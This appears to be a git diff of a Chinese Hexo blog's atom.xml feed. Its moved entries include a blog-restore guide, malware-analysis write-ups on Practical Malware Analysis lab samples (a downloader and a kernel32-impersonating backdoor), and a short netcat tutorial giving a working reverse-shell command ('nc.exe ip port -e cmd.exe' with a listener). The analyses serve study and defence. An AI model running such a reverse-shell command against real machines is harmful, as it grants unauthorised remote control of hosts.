@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://18428381824.github.io/"/>
-  <updated>2017-11-05T04:46:05.421Z</updated>
+  <updated>2017-11-05T04:50:39.562Z</updated>
   <id>http://18428381824.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>hexo 博客恢复</title>
+    <title></title>
     <link href="http://18428381824.github.io/2017/11/05/hexo%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/"/>
     <id>http://18428381824.github.io/2017/11/05/hexo博客恢复/</id>
+    <published>2017-11-05T04:48:39.558Z</published>
+    <updated>2017-11-05T04:50:39.562Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>title: 更新内容<br>tags: 更新说明,小书匠<br>grammar_wavedrom: true</p><h2 id="grammar-decorate-true"><a href="#grammar-decorate-true" class="headerlink" title="grammar_decorate: true"></a>grammar_decorate: true</h2><h2 id="1-安装node-js和git"><a href="#1-安装node-js和git" class="headerlink" title="1.安装node.js和git"></a>1.安装node.js和git</h2><p> 这个不用多说，直接下载安装就行了。</p><h2 id="2-配置-git-个人信息，生成新的-ssh-密钥："><a href="#2-配置-git-个人信息，生成新的-ssh-密钥：" class="headerlink" title="2.配置 git 个人信息，生成新的 ssh 密钥："></a>2.配置 git 个人信息，生成新的 ssh 密钥：</h2><p>git config –global user.name “xxxxxx”<br>git config –global user.email “xxxxxx”<br>ssh-keygen -t rsa -C “xxxxxxxx(邮箱)”</p><h2 id="3-添加公钥"><a href="#3-添加公钥" class="headerlink" title="3.添加公钥"></a>3.添加公钥</h2><p>在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。</p><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><p>建议先<br>npm install cnpm -g –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="external">https://registry.npm.taobao.org</a><br>安装的时候 用cpm 代替npm<br>这样的话npm 安装比较快而且不容易失败<br>cnpm install hexo-cli -g</p><h2 id="5-删除博客文件夹文件，保留部分"><a href="#5-删除博客文件夹文件，保留部分" class="headerlink" title="5.删除博客文件夹文件，保留部分"></a>5.删除博客文件夹文件，保留部分</h2><p>打开原来的博客文件夹,只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。</p><h2 id="6-git-bush"><a href="#6-git-bush" class="headerlink" title="6.git bush"></a>6.git bush</h2><p>在本文件夹下git bush,运行cnpm install</p><h2 id="7-安装部署插件"><a href="#7-安装部署插件" class="headerlink" title="7.安装部署插件"></a>7.安装部署插件</h2><p>npm install hexo-deployer-git –save</p><h2 id="8-测试"><a href="#8-测试" class="headerlink" title="8.测试"></a>8.测试</h2><p>此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;p&gt;title: 更新内容&lt;br&gt;tags: 更新说明,小书匠&lt;br&gt;grammar_wavedrom: true&lt;/p&gt;
+&lt;h2 id=&quot;grammar-decorate-true&quot;&gt;&lt;a href=&quot;#grammar-decorate-true&quot; class=&quot;h
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>重装系统后hexo 博客恢复</title>
+    <link href="http://18428381824.github.io/2017/11/05/hexo%20%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/"/>
+    <id>http://18428381824.github.io/2017/11/05/hexo 博客恢复/</id>
     <published>2017-11-04T16:00:00.000Z</published>
-    <updated>2017-11-05T04:46:05.421Z</updated>
+    <updated>2017-11-05T04:50:51.091Z</updated>
     
     <content type="html"><![CDATA[<h2 id="1-安装node-js和git"><a href="#1-安装node-js和git" class="headerlink" title="1.安装node.js和git"></a>1.安装node.js和git</h2><p> 这个不用多说，直接下载安装就行了。</p><h2 id="2-配置-git-个人信息，生成新的-ssh-密钥："><a href="#2-配置-git-个人信息，生成新的-ssh-密钥：" class="headerlink" title="2.配置 git 个人信息，生成新的 ssh 密钥："></a>2.配置 git 个人信息，生成新的 ssh 密钥：</h2><p>git config –global user.name “xxxxxx”<br>git config –global user.email “xxxxxx”<br>ssh-keygen -t rsa -C “xxxxxxxx(邮箱)”</p><h2 id="3-添加公钥"><a href="#3-添加公钥" class="headerlink" title="3.添加公钥"></a>3.添加公钥</h2><p>在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。</p><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><p>建议先<br>npm install cnpm -g –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="external">https://registry.npm.taobao.org</a><br>安装的时候 用cpm 代替npm<br>这样的话npm 安装比较快而且不容易失败<br>cnpm install hexo-cli -g</p><h2 id="5-删除博客文件夹文件，保留部分"><a href="#5-删除博客文件夹文件，保留部分" class="headerlink" title="5.删除博客文件夹文件，保留部分"></a>5.删除博客文件夹文件，保留部分</h2><p>打开原来的博客文件夹,只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。</p><h2 id="6-git-bush"><a href="#6-git-bush" class="headerlink" title="6.git bush"></a>6.git bush</h2><p>在本文件夹下git bush,运行cnpm install</p><h2 id="7-安装部署插件"><a href="#7-安装部署插件" class="headerlink" title="7.安装部署插件"></a>7.安装部署插件</h2><p>npm install hexo-deployer-git –save</p><h2 id="8-测试"><a href="#8-测试" class="headerlink" title="8.测试"></a>8.测试</h2><p>此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。</p>]]></content>
     
@@ -34,10 +57,10 @@
     
     </summary>
     
-      <category term="杂学" scheme="http://18428381824.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
     
     
-      <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
     
   </entry>
   
@@ -123,31 +146,6 @@ ubuntu系统
   </entry>
   
   <entry>
-    <title>恶意代码重定向</title>
-    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
-    <published>2017-10-15T16:00:00.000Z</published>
-    <updated>2017-10-25T07:11:55.201Z</updated>
-    
-    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
-      
-    
-    </summary>
-    
-      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
-    
-    
-      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title>对抗反汇编</title>
     <link href="http://18428381824.github.io/2017/10/16/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
     <id>http://18428381824.github.io/2017/10/16/对抗反汇编/</id>
@@ -201,6 +199,31 @@ ubuntu系统
     
     
       <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>恶意代码重定向</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
+    <published>2017-10-15T16:00:00.000Z</published>
+    <updated>2017-10-25T07:11:55.201Z</updated>
+    
+    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
     
   </entry>
   
@@ -368,21 +391,20 @@ ubuntu系统
   </entry>
   
   <entry>
-    <title>netcat-反向shell</title>
-    <link href="http://18428381824.github.io/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/"/>
-    <id>http://18428381824.github.io/2017/08/06/netcat—反向shell/</id>
+    <title>数据隐藏-ADS</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/"/>
+    <id>http://18428381824.github.io/2017/08/06/数据隐藏-ADS/</id>
     <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:12:16.459Z</updated>
+    <updated>2017-08-06T09:08:12.659Z</updated>
     
-    <content type="html"><![CDATA[<p>利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell</p><p>1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe</p><p>2.linux 主机执行 nc  -l  -p 80</p><p>3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。</p>]]></content>
+    <content type="html"><![CDATA[<p>数据隐藏的一种方式–ADS</p><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p><p>详见<a href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin" target="_blank" rel="external">ADS</a></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell&lt;/p&gt;
-&lt;p&gt;1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe&lt;/p&gt;
-&lt;p&gt;2.linux 主机执行 nc  -l 
+        &lt;p&gt;数据隐藏的一种方式–ADS&lt;/p&gt;
+&lt;p&gt;NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用N
       
     
     </summary>
@@ -425,32 +447,6 @@ AX=0FF80H
   </entry>
   
   <entry>
-    <title>数据隐藏-ADS</title>
-    <link href="http://18428381824.github.io/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/"/>
-    <id>http://18428381824.github.io/2017/08/06/数据隐藏-ADS/</id>
-    <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:08:12.659Z</updated>
-    
-    <content type="html"><![CDATA[<p>数据隐藏的一种方式–ADS</p><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p><p>详见<a href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin" target="_blank" rel="external">ADS</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;数据隐藏的一种方式–ADS&lt;/p&gt;
-&lt;p&gt;NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用N
-      
-    
-    </summary>
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
     <title>进程替换的一种方式</title>
     <link href="http://18428381824.github.io/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/"/>
     <id>http://18428381824.github.io/2017/08/06/进程替换的一种检测方式/</id>
@@ -466,6 +462,33 @@ AX=0FF80H
         &lt;p&gt;进程替换问题&lt;/p&gt;
 &lt;p&gt;svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;http://i.imgur.com/3u192lY.png&quot; alt=&quot;&quot;&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>netcat-反向shell</title>
+    <link href="http://18428381824.github.io/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/"/>
+    <id>http://18428381824.github.io/2017/08/06/netcat—反向shell/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:12:16.459Z</updated>
+    
+    <content type="html"><![CDATA[<p>利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell</p><p>1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe</p><p>2.linux 主机执行 nc  -l  -p 80</p><p>3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell&lt;/p&gt;
+&lt;p&gt;1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe&lt;/p&gt;
+&lt;p&gt;2.linux 主机执行 nc  -l 
       
     
     </summary>
@@ -522,33 +545,6 @@ AX=0FF80H
         &lt;p&gt;###步骤如下&lt;/p&gt;
 &lt;p&gt;1.分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe,链接就不贴了，百度一搜就可以搜到了。&lt;/p&gt;
 &lt;p&gt;2.首先在虚拟机里准备好必要的工具，静态分析工具包括PEView,strings,(IDA),Dependency W
-      
-    
-    </summary>
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-    
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>恶意代码分析第二记</title>
-    <link href="http://18428381824.github.io/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%902/"/>
-    <id>http://18428381824.github.io/2017/08/01/恶意代码分析2/</id>
-    <published>2017-07-31T16:00:00.000Z</published>
-    <updated>2017-08-01T02:21:30.462Z</updated>
-    
-    <content type="html"><![CDATA[<p>###步骤如下</p><p>1.样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll.<br>2.过程如下：</p><p>首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp.</p><p><img src="http://i.imgur.com/wiWLOYN.png" alt=""><img src="http://i.imgur.com/3SglnDX.png" alt=""></p><p>然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。</p><p><img src="http://i.imgur.com/NPtmzMv.png" alt=""><img src="http://i.imgur.com/pa6CXX9.png" alt=""></p><p>查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。<br>对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对’C:\Windows\System32\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到’C:\Windows\System32\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。</p><p><img src="http://i.imgur.com/9bkmJL4.png" alt=""><br><img src="http://i.imgur.com/w91FP9E.png" alt=""><br><img src="http://i.imgur.com/1Tw8cLs.png" alt=""></p><p>然后我们对lab07-03.dll进行静态ida反汇编看一下。dll的代码就很简单了，首先创建互斥体保证只有一个再运行，然后建立socket网络连接，ip是127.26.152.13，端口是80，首先 发送hello,并且利用shutdown()函数关闭套接字的写功能，然后就是recv进行监听了，如果受到的字符串是sleep就睡眠60秒，如果是exec那就是远程执行，创建进程，命令行参数此时未知。</p><p><img src="http://i.imgur.com/VzM4RLc.png" alt=""><br>下一步就是验证我们的猜想，在命令行加上正确的参数运行程序，构建好模拟网路和监控工具。<br><img src="http://i.imgur.com/w9wS2Qg.png" alt=""><br><img src="http://i.imgur.com/KOWwJp5.png" alt=""></p><p>如图看到了文件映射的操作，以及大量的遍历操作，跟我们通过反汇编得到的结果几乎一致。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;###步骤如下&lt;/p&gt;
-&lt;p&gt;1.样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll.&lt;br&gt;2.过程如下：&lt;/p&gt;
-&lt;p&gt;首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件
       
     
     </summary>
